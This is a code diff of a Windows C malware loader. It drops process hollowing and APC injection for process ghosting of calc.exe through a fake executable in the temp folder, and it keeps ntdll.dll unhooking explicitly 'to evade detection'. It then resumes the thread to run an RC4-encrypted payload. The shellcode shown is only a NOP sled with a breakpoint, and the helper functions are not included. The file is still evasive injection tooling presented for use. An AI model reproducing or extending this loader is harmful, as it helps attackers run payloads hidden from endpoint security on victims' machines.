@@ -1,14 +1,15 @@
 #include <windows.h>
+#include <shlobj.h>  // For SHGetFolderPathA
 #include <stdio.h>
 #include "ProcessCreation.h"
 #include "PayloadInjection.h"
 #include "RC4Encryption.h"
 #include "Syscalls.h"
 #include "Hollowing.h"
+#include "Ghosting.h"
 
 int main() {
-    DWORD processId;
-    HANDLE hProcess, hThread;
+    HANDLE hProcess = NULL, hThread = NULL;
     SyscallStruct St;
 
     // Initialize syscalls
@@ -20,7 +21,7 @@ int main() {
     // Step 1: Define the payload and RC4 encryption key
     printf("[*] Defining payload and encryption key...\n");
     unsigned char payload[] = {
-        0x90, 0x90, 0x90, /* shellcode here */
+        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xCC // Example shellcode (NOP sled with INT3 for debugging)
     };
     unsigned char key[] = { 0x11, 0x22, 0x33, 0x44 };  // Example key
 
@@ -29,54 +30,43 @@ int main() {
     RC4Encrypt(payload, sizeof(payload), key, sizeof(key));
     printf("[+] Payload encrypted successfully.\n");
 
-    // Step 3: Create a suspended process (cmd.exe)
-    printf("[*] Creating a suspended process (cmd.exe)...\n");
-    if (!CreateSuspendedProcess("cmd.exe", &processId, &hProcess, &hThread)) {
-        printf("[!] Failed to create process.\n");
-        return -1;
-    }
-    printf("[+] Process created successfully with PID: %d.\n", processId);
+    // Dynamically retrieve temp path for the fake executable
+    char tempPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempPath);
+    strcat(tempPath, "fake_calc.exe");  // Creating fake executable path in temp folder
 
-    //// Step 4: Perform process hollowing
-    //if (!HollowProcess(hProcess, payload, sizeof(payload))) {
-    //    printf("[!] Process hollowing failed.\n");
-    //    return -1;
-    //}
+    printf("Fake executable will be created at: %s\n", tempPath);
 
-    //// Step 5: Unhook ntdll.dll to evade detection
-    //if (!UnhookDLL(hProcess)) {
-    //    printf("[!] Failed to unhook ntdll.dll.\n");
-    //    return -1;
-    //}
-    // Step 4: Perform process hollowing
-    if (!HollowProcess(hProcess, payload, sizeof(payload), &St)) {
-        printf("[!] Process hollowing failed.\n");
+    // Step 3: Perform Process Ghosting (ghost calc.exe)
+    printf("[*] Ghosting process (calc.exe)...\n");
+    if (!ProcessGhosting("C:\\Windows\\System32\\calc.exe", tempPath, &St, &hProcess, &hThread)) {
+        printf("[!] Process ghosting failed.\n");
         return -1;
     }
 
-    // Step 5: Unhook ntdll.dll to evade detection
+    printf("[+] Process ghosted successfully.\n");
+
+    // Check if the process and thread handles are valid before proceeding
+    if (hProcess == NULL || hThread == NULL) {
+        printf("[!] Invalid process or thread handle.\n");
+        return -1;
+    }
+
+    // Optional: Unhook ntdll.dll to evade detection (if required)
+    printf("[*] Unhooking ntdll.dll...\n");
     if (!UnhookDLL(hProcess, &St)) {
         printf("[!] Failed to unhook ntdll.dll.\n");
         return -1;
     }
 
-
-    // Step 6: Queue the payload for execution using APC injection
-    printf("[*] Queuing the payload using NtQueueApcThread...\n");
-    PVOID pBaseAddress = NULL; // Injected base address
-    SIZE_T regionSize = sizeof(payload);
-    ULONG oldProtect;
-    NTSTATUS status = St.NtQueueApcThread(hThread, pBaseAddress, NULL, NULL, 0);  // ULONG 0
-    if (status != 0) {
-        printf("[!] NtQueueApcThread failed with error: 0x%08X\n", status);
-        return -1;
-    }
-    printf("[+] Payload successfully queued for APC injection.\n");
-
-    // Step 7: Resume the thread to execute the payload
+    // Step 4: Resume the thread to execute the payload
     printf("[*] Resuming the thread to execute the payload...\n");
     ResumeThread(hThread);
     printf("[+] Thread resumed, payload should now execute.\n");
+
+    // Close handles after use
+    CloseHandle(hProcess);
+    CloseHandle(hThread);
 
     return 0;
 }
